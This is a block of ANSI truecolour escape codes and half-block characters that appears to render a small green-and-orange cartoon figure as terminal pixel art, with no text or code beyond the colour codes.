


                            [38;2;26;43;21m▄[38;2;58;91;50m▄[48;2;116;117;116m[38;2;68;119;56m▄[48;2;98;98;98m[38;2;86;143;70m▄[48;2;98;98;98m[38;2;100;153;87m▄[48;2;63;65;63m[38;2;102;164;86m▄[48;2;46;49;44m[38;2;98;168;79m▄[48;2;43;45;43m[38;2;91;155;75m▄[48;2;61;62;61m[38;2;78;137;63m▄[48;2;102;101;102m[38;2;64;112;52m▄[0m[38;2;38;67;32m▄[38;2;20;35;16m▄[38;2;10;20;8m▄[38;2;15;21;13m▄[0m
                    [38;2;49;80;41m▄[38;2;73;133;59m▄[48;2;20;21;20m[38;2;91;163;72m▄[48;2;14;27;12m[38;2;96;174;76m▄[48;2;51;92;41m[38;2;98;177;78m▄[48;2;86;155;68m[38;2;98;177;78m▄[48;2;96;173;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;97;175;76m[38;2;98;177;78m▄[48;2;93;168;74m[38;2;98;177;78m▄[48;2;99;163;83m[38;2;97;177;77m▄[48;2;99;151;86m[38;2;98;177;78m▄[48;2;35;57;29m[38;2;98;176;78m▄[48;2;19;21;19m[38;2;94;169;75m▄[0m[38;2;70;125;56m▄[0m
             [38;2;42;65;36m▄[38;2;62;106;52m▄[48;2;94;95;94m[38;2;86;152;70m▄[48;2;57;72;53m[38;2;96;174;77m▄[48;2;57;96;47m[38;2;98;177;78m▄[48;2;78;136;62m[38;2;98;177;78m▄[48;2;95;167;76m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;77m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m[38;2;76;137;60m▄[48;2;98;177;78m[38;2;54;97;42m▄[48;2;99;179;79m[38;2;39;71;30m▄[48;2;100;181;79m[38;2;35;60;30m▄[48;2;101;181;81m[38;2;42;66;37m▄[48;2;100;177;80m[38;2;52;73;45m▄[48;2;95;175;76m[38;2;47;75;40m▄[48;2;94;178;73m[38;2;41;75;33m▄[48;2;98;179;78m[38;2;42;73;34m▄[48;2;99;180;79m[38;2;40;70;33m▄[48;2;99;179;78m[38;2;44;75;36m▄[48;2;97;177;77m[38;2;55;93;46m▄[48;2;97;176;77m[38;2;65;113;52m▄[48;2;98;177;78m[38;2;79;141;63m▄[48;2;98;177;78m[38;2;93;166;75m▄[48;2;98;177;78m[38;2;99;177;79m▄[48;2;98;177;78m[38;2;97;177;78m▄[48;2;98;177;78m[38;2;97;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;94;170;75m[38;2;98;177;78m▄[48;2;71;128;56m[38;2;98;177;78m▄[48;2;34;56;28m[38;2;97;175;77m▄[48;2;64;66;64m[38;2;78;140;62m▄[0m
         [48;2;66;112;54m[38;2;98;177;78m▄[48;2;80;133;66m[38;2;98;177;78m▄[48;2;95;162;76m[38;2;98;177;78m▄[48;2;96;171;76m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m[38;2;96;174;76m▄[48;2;98;177;78m[38;2;74;130;59m▄[48;2;98;176;78m[38;2;32;49;27m▄[48;2;95;166;76m[38;2;18;29;15m▄[48;2;73;126;59m[38;2;65;113;53m▄[48;2;40;62;34m[38;2;107;209;83m▄[48;2;23;43;19m[38;2;77;220;42m▄[48;2;32;72;22m[38;2;72;218;36m▄[48;2;55;155;30m[38;2;73;217;37m▄[48;2;71;203;38m[38;2;73;217;37m▄[48;2;79;212;46m[38;2;73;218;37m▄[48;2;81;216;48m[38;2;73;218;37m▄[48;2;82;220;48m[38;2;73;218;37m▄[48;2;79;221;44m[38;2;73;218;37m▄[48;2;76;219;40m[38;2;73;218;37m▄[48;2;76;218;40m[38;2;73;218;37m▄[48;2;75;213;41m[38;2;73;218;37m▄[48;2;79;203;48m[38;2;73;218;37m▄[48;2;76;175;52m[38;2;73;218;37m▄[48;2;52;127;33m[38;2;73;218;37m▄[48;2;29;75;18m[38;2;73;217;37m▄[48;2;19;45;12m[38;2;73;218;36m▄[48;2;45;74;38m[38;2;65;196;33m▄[48;2;76;127;62m[38;2;44;132;24m▄[48;2;90;158;72m[38;2;16;45;10m▄[48;2;97;175;77m[38;2;28;50;22m▄[48;2;98;177;78m[38;2;80;145;64m▄[48;2;98;177;78m[38;2;97;175;77m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;98;177;77m▄[48;2;97;173;78m[38;2;98;177;78m▄[48;2;69;114;56m[38;2;98;177;78m▄[48;2;30;38;28m[38;2;103;179;83m▄[0m[38;2;99;149;87m▄[0m
         [48;2;98;177;78m[38;2;98;177;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;178;78m▄[48;2;98;177;78m[38;2;98;178;78m▄[48;2;98;177;78m[38;2;83;150;66m▄[48;2;98;177;78m[38;2;44;80;34m▄[48;2;99;179;78m[38;2;33;49;28m▄[48;2;87;159;69m[38;2;68;97;61m▄[48;2;46;84;37m[38;2;87;165;68m▄[48;2;25;37;21m[38;2;83;208;52m▄[48;2;59;131;42m[38;2;73;219;37m▄[48;2;74;199;43m[38;2;74;223;37m▄[48;2;72;213;38m[38;2;67;204;35m▄[48;2;73;218;37m[38;2;55;171;29m▄[48;2;72;218;36m[38;2;59;136;22m▄[48;2;72;218;36m[38;2;103;132;15m▄[48;2;73;219;37m[38;2;149;133;9m▄[48;2;72;220;37m[38;2;168;130;7m▄[48;2;73;220;37m[38;2;167;118;5m▄[48;2;72;218;37m[38;2;106;78;4m▄[48;2;69;210;36m[38;2;93;69;4m▄[48;2;66;199;34m[38;2;173;117;4m▄[48;2;63;192;32m[38;2;177;119;4m▄[48;2;62;186;32m[38;2;173;116;4m▄[48;2;61;186;31m[38;2;176;115;4m▄[48;2;63;191;32m[38;2;174;115;4m▄[48;2;67;202;34m[38;2;170;113;4m▄[48;2;70;213;36m[38;2;180;118;3m▄[48;2;72;219;37m[38;2;175;117;4m▄[48;2;73;220;37m[38;2;154;120;7m▄[48;2;73;220;37m[38;2;80;94;11m▄[48;2;73;219;37m[38;2;48;93;15m▄[48;2;73;218;37m[38;2;41;112;19m▄[48;2;72;215;36m[38;2;45;144;25m▄[48;2;64;192;32m[38;2;63;191;32m▄[48;2;32;99;16m[38;2;73;218;37m▄[48;2;21;41;16m[38;2;72;210;38m▄[48;2;38;66;30m[38;2;67;177;41m▄[48;2;79;141;63m[38;2;53;123;36m▄[48;2;98;178;78m[38;2;32;57;25m▄[48;2;98;179;77m[38;2;25;46;20m▄[48;2;97;177;77m[38;2;56;100;46m▄[48;2;98;177;78m[38;2;93;165;75m▄[48;2;97;176;77m[38;2;100;181;80m▄[48;2;98;177;77m[38;2;97;176;76m▄[48;2;97;176;78m[38;2;98;177;78m▄[48;2;99;174;79m[38;2;98;177;78m▄[0m
         [48;2;98;178;78m[38;2;46;76;38m▄[48;2;100;178;80m[38;2;50;69;45m▄[48;2;99;176;80m[38;2;35;46;33m▄[48;2;82;148;65m[38;2;7;9;6m▄[48;2;64;117;50m[38;2;35;54;30m▄[48;2;42;77;34m[38;2;52;107;39m▄[48;2;26;46;21m[38;2;80;194;52m▄[48;2;34;71;26m[38;2;73;216;38m▄[48;2;54;133;35m[38;2;67;192;32m▄[48;2;81;199;52m[38;2;81;158;23m▄[48;2;80;218;46m[38;2;100;110;11m▄[48;2;66;199;33m[38;2;152;98;2m▄[48;2;60;157;26m[38;2;220;129;1m▄[48;2;80;128;18m[38;2;251;145;0m▄[48;2;120;110;9m[38;2;255;147;0m▄[48;2;154;106;4m[38;2;255;147;0m▄[48;2;181;114;2m[38;2;255;147;0m▄[48;2;230;134;0m[38;2;255;147;0m▄[48;2;251;144;0m[38;2;255;147;0m▄[48;2;254;146;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;163;94;0m[38;2;134;78;0m▄[48;2;2;1;0m[38;2;58;33;0m▄[48;2;13;7;0m[38;2;133;76;0m▄[48;2;64;38;0m[38;2;12;7;0m▄[48;2;250;144;0m[38;2;234;135;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;146;0m[38;2;255;147;0m▄[48;2;239;143;2m[38;2;255;147;0m▄[48;2;223;131;1m[38;2;255;147;0m▄[48;2;192;120;2m[38;2;255;147;0m▄[48;2;130;96;5m[38;2;255;147;0m▄[48;2;82;88;9m[38;2;255;148;0m▄[48;2;62;104;15m[38;2;247;147;1m▄[48;2;49;132;22m[38;2;212;134;3m▄[48;2;57;165;32m[38;2;144;95;3m▄[48;2;53;117;38m[38;2;74;61;8m▄[48;2;50;97;39m[38;2;47;60;21m▄[48;2;35;56;29m[38;2;47;81;33m▄[48;2;17;22;15m[38;2;20;34;19m▄[48;2;31;50;26m[38;2;48;73;42m▄[48;2;55;90;47m[38;2;37;56;33m▄[48;2;78;132;64m[38;2;21;31;18m▄[48;2;95;167;78m[38;2;18;26;16m▄[0m
         [48;2;48;74;43m[38;2;51;78;45m▄[48;2;48;74;43m[38;2;50;76;44m▄[48;2;46;71;42m[38;2;12;17;11m▄[48;2;32;54;28m[38;2;45;93;35m▄[48;2;58;112;46m[38;2;26;45;17m▄[48;2;55;130;37m[38;2;121;83;5m▄[48;2;57;133;27m[38;2;232;138;0m▄[48;2;101;96;8m[38;2;253;146;0m▄[48;2;200;118;1m[38;2;254;147;0m▄[48;2;248;144;0m[38;2;255;147;0m▄[48;2;254;147;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;173;100;0m[38;2;210;122;0m▄[48;2;172;100;0m[38;2;76;44;0m▄[48;2;214;123;0m[38;2;153;88;0m▄[48;2;36;21;0m[38;2;162;94;0m▄[48;2;201;116;0m[38;2;20;12;0m▄[48;2;254;147;0m[38;2;238;137;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m▄[48;2;241;143;1m[38;2;255;147;0m▄[48;2;213;125;0m[38;2;255;147;0m▄[48;2;117;73;3m[38;2;252;147;1m▄[48;2;25;36;21m[38;2;94;69;18m▄[48;2;50;77;44m[38;2;39;59;33m▄[48;2;51;78;45m [48;2;51;78;44m[38;2;51;78;45m▄[0m
         [48;2;51;78;45m[38;2;50;76;44m▄[48;2;40;58;34m[38;2;43;36;13m▄[48;2;38;37;6m[38;2;240;143;2m▄[48;2;149;95;6m[38;2;254;147;0m▄[48;2;226;134;1m[38;2;255;147;0m▄[48;2;253;146;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;243;140;0m▄[48;2;116;67;0m[38;2;90;52;0m▄[48;2;237;137;0m[38;2;254;147;0m▄[48;2;248;143;0m[38;2;255;147;0m▄[48;2;250;144;0m[38;2;255;147;0m▄[48;2;45;25;0m[38;2;191;110;0m▄[48;2;64;36;0m[38;2;32;18;0m▄[48;2;245;141;0m[38;2;152;87;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m▄[48;2;230;140;6m[38;2;254;147;0m▄[48;2;25;21;7m[38;2;143;86;2m▄[48;2;48;74;42m[38;2;39;60;34m▄[48;2;51;78;45m [0m
         [48;2;41;63;37m[38;2;40;47;23m▄[48;2;119;70;1m[38;2;230;135;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;180;104;0m[38;2;120;68;0m▄[48;2;135;78;0m[38;2;158;91;0m▄[48;2;255;147;0m[38;2;250;145;0m▄[48;2;255;147;0m [48;2;255;147;0m[38;2;254;146;0m▄[48;2;252;145;0m[38;2;209;120;0m▄[48;2;54;31;0m[38;2;61;35;0m▄[48;2;94;54;0m[38;2;159;91;0m▄[48;2;254;146;0m[38;2;244;140;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;240;144;1m[38;2;255;147;0m▄[48;2;36;40;18m[38;2;70;49;6m▄[48;2;50;78;45m[38;2;45;69;40m▄[0m
         [48;2;65;48;9m[38;2;98;64;6m▄[48;2;255;149;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;254;146;0m▄[48;2;225;130;0m[38;2;175;100;0m▄[48;2;210;120;0m[38;2;253;146;0m▄[48;2;209;121;0m[38;2;254;147;0m▄[48;2;86;49;0m[38;2;189;109;0m▄[48;2;254;146;0m[38;2;142;81;0m▄[48;2;255;147;0m[38;2;102;59;0m▄[48;2;199;115;0m[38;2;69;40;0m▄[48;2;244;141;0m[38;2;238;138;0m▄[48;2;253;146;0m[38;2;184;105;0m▄[48;2;200;115;0m[38;2;231;134;0m▄[48;2;253;147;0m[38;2;254;146;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;149;98;7m[38;2;215;132;5m▄[48;2;35;54;32m[38;2;31;42;22m▄[0m
         [48;2;133;82;3m[38;2;153;89;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;255;146;0m▄[48;2;255;147;0m[38;2;255;146;0m▄[48;2;255;147;0m [48;2;255;147;0m[38;2;254;148;0m▄[48;2;255;147;0m[38;2;248;147;0m▄[48;2;254;147;0m[38;2;242;142;0m▄[48;2;204;116;0m[38;2;224;131;0m▄[48;2;200;115;0m[38;2;205;124;1m▄[48;2;199;115;0m[38;2;175;109;2m▄[48;2;172;100;0m[38;2;157;102;2m▄[48;2;168;97;0m[38;2;172;114;3m▄[48;2;206;119;0m[38;2;156;115;5m▄[48;2;215;125;0m[38;2;138;111;7m▄[48;2;180;105;0m[38;2;121;105;8m▄[48;2;233;136;0m[38;2;120;109;8m▄[48;2;254;148;0m[38;2;116;111;9m▄[48;2;254;148;0m[38;2;112;111;10m▄[48;2;255;148;0m[38;2;130;121;10m▄[48;2;254;148;0m[38;2;103;105;10m▄[48;2;254;148;0m[38;2;99;99;9m▄[48;2;254;148;0m[38;2;106;98;8m▄[48;2;254;148;0m[38;2;106;96;8m▄[48;2;255;148;0m[38;2;118;98;7m▄[48;2;255;147;0m[38;2;123;101;7m▄[48;2;255;147;0m[38;2;129;99;6m▄[48;2;255;147;0m[38;2;141;100;5m▄[48;2;255;147;0m[38;2;166;111;4m▄[48;2;255;147;0m[38;2;189;122;4m▄[48;2;255;147;0m[38;2;217;131;1m▄[48;2;255;147;0m[38;2;248;145;0m▄[48;2;255;147;0m[38;2;250;148;0m▄[48;2;255;147;0m[38;2;254;149;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;147;1m[38;2;254;147;0m▄[48;2;47;44;15m[38;2;81;54;7m▄[0m
         [48;2;163;95;0m[38;2;176;103;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;254;147;0m▄[48;2;255;147;0m[38;2;250;144;0m▄[48;2;255;147;0m[38;2;238;146;1m▄[48;2;254;147;0m[38;2;170;117;4m▄[48;2;252;147;0m[38;2;78;65;5m▄[48;2;239;144;1m[38;2;36;71;11m▄[48;2;220;136;2m[38;2;41;122;21m▄[48;2;193;124;2m[38;2;59;179;31m▄[48;2;178;119;4m[38;2;69;210;35m▄[48;2;129;104;6m[38;2;73;219;37m▄[48;2;67;87;10m[38;2;73;219;37m▄[48;2;61;106;15m[38;2;73;218;37m▄[48;2;52;126;21m[38;2;73;218;37m▄[48;2;52;150;25m[38;2;73;218;37m▄[48;2;58;177;30m[38;2;73;218;37m▄[48;2;63;194;33m[38;2;73;218;37m▄[48;2;66;204;34m[38;2;73;218;37m▄[48;2;69;212;36m[38;2;73;218;37m▄[48;2;72;217;36m[38;2;73;218;37m▄[48;2;72;219;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;74;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;219;37m[38;2;73;218;37m▄[48;2;72;214;36m[38;2;73;218;37m▄[48;2;68;207;35m[38;2;73;218;37m▄[48;2;65;197;34m[38;2;73;218;37m▄[48;2;61;185;32m[38;2;73;218;37m▄[48;2;51;157;27m[38;2;73;218;37m▄[48;2;41;125;21m[38;2;73;218;37m▄[48;2;40;106;18m[38;2;73;218;37m▄[48;2;75;92;10m[38;2;73;218;37m▄[48;2;76;85;10m[38;2;73;219;37m▄[48;2;112;94;7m[38;2;72;216;36m▄[48;2;162;113;5m[38;2;64;194;33m▄[48;2;219;131;0m[38;2;50;152;26m▄[48;2;231;138;1m[38;2;30;65;14m▄[48;2;252;147;0m[38;2;106;71;5m▄[48;2;97;61;4m[38;2;30;31;7m▄[0m
         [48;2;186;108;0m[38;2;185;108;0m▄[48;2;255;147;0m[38;2;254;148;0m▄[48;2;255;147;0m[38;2;247;144;0m▄[48;2;255;147;0m[38;2;188;113;1m▄[48;2;255;147;0m[38;2;110;100;8m▄[48;2;248;147;0m[38;2;72;136;20m▄[48;2;206;124;1m[38;2;62;175;29m▄[48;2;115;81;4m[38;2;67;204;34m▄[48;2;55;92;13m[38;2;72;217;36m▄[48;2;60;157;26m[38;2;73;218;37m▄[48;2;66;195;32m[38;2;73;218;37m▄[48;2;70;212;35m[38;2;73;218;37m▄[48;2;72;215;36m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;210;37m[38;2;71;214;37m▄[48;2;58;142;37m[38;2;57;136;37m▄[48;2;51;109;39m[38;2;54;109;40m▄[48;2;36;76;26m[38;2;38;71;31m▄[0m
         [48;2;73;63;12m[38;2;24;46;20m▄[48;2;89;67;7m[38;2;54;120;38m▄[48;2;67;119;19m[38;2;66;192;35m▄[48;2;61;177;29m[38;2;73;217;37m▄[48;2;71;213;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;71;214;35m[38;2;42;129;21m▄[48;2;43;131;22m[38;2;4;10;2m▄[48;2;37;111;19m[38;2;4;10;2m▄[48;2;60;180;30m[38;2;7;22;3m▄[48;2;73;218;37m[38;2;62;187;31m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;72;217;36m▄[48;2;69;208;35m[38;2;20;61;10m▄[48;2;43;129;22m[38;2;4;11;2m▄[48;2;38;116;19m[38;2;3;8;1m▄[48;2;64;192;32m[38;2;19;57;10m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;214;36m[38;2;71;213;36m▄[48;2;55;130;37m[38;2;55;123;38m▄[48;2;54;108;41m[38;2;56;110;44m▄[48;2;35;60;30m[38;2;35;57;30m▄[0m
         [48;2;37;68;29m[38;2;38;61;33m▄[48;2;58;132;39m[38;2;62;134;45m▄[48;2;64;179;36m[38;2;55;129;37m▄[48;2;72;217;36m[38;2;71;210;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;27;82;14m[38;2;59;178;30m▄[48;2;4;11;3m[38;2;3;9;1m▄[48;2;0;0;0m[38;2;8;18;4m▄[48;2;1;3;1m[38;2;4;12;2m▄[48;2;36;112;19m[38;2;54;163;27m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;210;36m[38;2;72;217;36m▄[48;2;4;11;1m[38;2;9;28;4m▄[48;2;0;0;0m[38;2;6;16;3m▄[48;2;1;3;1m[38;2;6;15;3m▄[48;2;13;39;6m[38;2;32;94;15m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;207;36m[38;2;67;196;36m▄[48;2;52;110;38m [48;2;57;101;47m[38;2;56;90;47m▄[48;2;36;55;31m[38;2;38;58;33m▄[0m
         [48;2;40;63;35m[38;2;43;67;38m▄[48;2;61;117;48m[38;2;45;80;38m▄[48;2;54;114;39m[38;2;52;110;38m▄[48;2;64;177;36m[38;2;59;150;37m▄[48;2;72;217;36m[38;2;72;214;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;73;218;37m▄[48;2;61;182;30m[38;2;73;218;37m▄[48;2;45;135;22m[38;2;73;218;37m▄[48;2;58;174;29m[38;2;73;218;37m▄[48;2;72;217;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;212;35m[38;2;72;216;36m▄[48;2;34;101;17m[38;2;11;32;5m▄[48;2;34;101;17m[38;2;1;2;1m▄[48;2;34;98;18m[38;2;1;3;1m▄[48;2;35;101;18m[38;2;1;1;1m▄[48;2;35;100;17m[38;2;1;3;1m▄[48;2;57;170;29m[38;2;56;168;28m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;72;218;36m▄[48;2;66;197;33m[38;2;72;217;36m▄[48;2;46;139;23m[38;2;73;217;37m▄[48;2;54;163;27m[38;2;72;217;37m▄[48;2;71;212;36m[38;2;72;217;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;37m[38;2;70;204;36m▄[48;2;60;158;37m[38;2;53;122;37m▄[48;2;52;103;38m[38;2;52;104;40m▄[48;2;33;54;28m[38;2;21;34;18m▄[48;2;46;70;41m[38;2;49;76;44m▄[0m
         [48;2;49;76;44m[38;2;51;78;45m▄[48;2;32;51;28m[38;2;43;65;37m▄[48;2;61;125;45m[38;2;81;124;71m▄[48;2;54;124;38m[38;2;53;113;40m▄[48;2;68;202;36m[38;2;60;156;37m▄[48;2;73;218;37m[38;2;72;215;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;216;37m▄[48;2;73;217;37m[38;2;93;205;61m▄[48;2;79;213;44m[38;2;121;189;95m▄[48;2;85;210;51m[38;2;132;184;108m▄[48;2;82;211;47m[38;2;121;191;93m▄[48;2;73;217;37m[38;2;85;210;52m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;37;111;20m[38;2;71;214;36m▄[48;2;1;2;0m[38;2;44;128;22m▄[48;2;2;4;2m[38;2;15;39;8m▄[48;2;1;1;1m[38;2;29;82;14m▄[48;2;13;37;7m[38;2;68;204;34m▄[48;2;70;210;35m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;74;216;38m▄[48;2;82;211;47m[38;2;118;191;90m▄[48;2;100;200;70m[38;2;132;185;108m▄[48;2;103;201;72m[38;2;127;187;101m▄[48;2;98;203;67m[38;2;125;189;100m▄[48;2;85;209;52m[38;2;116;192;88m▄[48;2;73;217;37m[38;2;80;211;44m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;68;200;35m▄[48;2;63;170;35m[38;2;54;125;36m▄[48;2;51;103;38m[38;2;51;99;38m▄[48;2;49;101;36m[38;2;22;45;17m▄[48;2;30;47;26m[38;2;45;69;39m▄[48;2;51;78;45m [0m
         [48;2;51;78;45m [48;2;49;75;43m[38;2;51;78;45m▄[48;2;30;38;27m[38;2;39;59;35m▄[48;2;63;123;49m[38;2;71;110;62m▄[48;2;54;121;37m[38;2;56;119;40m▄[48;2;68;198;37m[38;2;60;158;37m▄[48;2;73;218;37m[38;2;71;216;36m▄[48;2;73;217;37m[38;2;73;216;38m▄[48;2;91;206;58m[38;2;110;196;81m▄[48;2;122;191;95m[38;2;126;188;100m▄[48;2;128;186;102m[38;2;130;187;104m▄[48;2;140;180;116m[38;2;128;187;103m▄[48;2;126;188;100m[38;2;106;197;76m▄[48;2;96;202;64m[38;2;75;215;39m▄[48;2;73;217;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;220;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m 